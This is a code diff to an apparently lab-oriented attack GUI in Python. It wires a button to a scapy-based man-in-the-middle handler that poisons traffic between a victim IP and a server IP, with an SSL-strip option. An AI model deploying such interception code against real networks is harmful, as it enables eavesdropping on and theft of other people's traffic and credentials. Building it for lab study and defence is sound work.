@@ -183,7 +183,38 @@ class AttackGUI:
                 self.log(f"  Server IP:  {server_ip}")
                 self.log(f"  SSL Strip:  {use_ssl}")
 
-                # TODO: call MITM function
+                if not victim or not server_ip:
+                    self.log("ERROR: Victim IP and Server IP required for MITM")
+                    return
+
+                # Auto-detect interface and own MAC
+                interface = sc.conf.iface
+                attacker_mac = self.get_attacker_mac()
+                # Dummy IPs for spoofing arguments (mitm_handler doesn't strictly need them passed if logic is internal)
+                # But looking at mitm_handler.py init signature:
+                # def __init__(self, interface, gateway_ip, victim_ip, attacker_mac, attacker_ip, attacker_ipv6, logger, target_ip=None):
+                
+                # We need to pass the Server IP as the "gateway" or "target" 
+                # In your specific lab setup, you want to spoof the SERVER (10.0.0.182), not the router.
+                # So we pass server_ip as gateway_ip to the poisoner.
+                
+                # We need own IP
+                attacker_ip = sc.get_if_addr(interface)
+                attacker_ipv6 = None # Simplify for now
+
+                try:
+                    mitm = MitmHandler(
+                        interface=interface,
+                        gateway_ip=server_ip, # We want to intercept traffic meant for SERVER
+                        victim_ip=victim,
+                        attacker_mac=attacker_mac,
+                        attacker_ip=attacker_ip,
+                        attacker_ipv6=attacker_ipv6,
+                        logger=self.log
+                    )
+                    mitm.start()
+                except Exception as e:
+                     self.log(f"Error starting MITM: {e}")
 
         threading.Thread(target=worker, daemon=True).start()
 
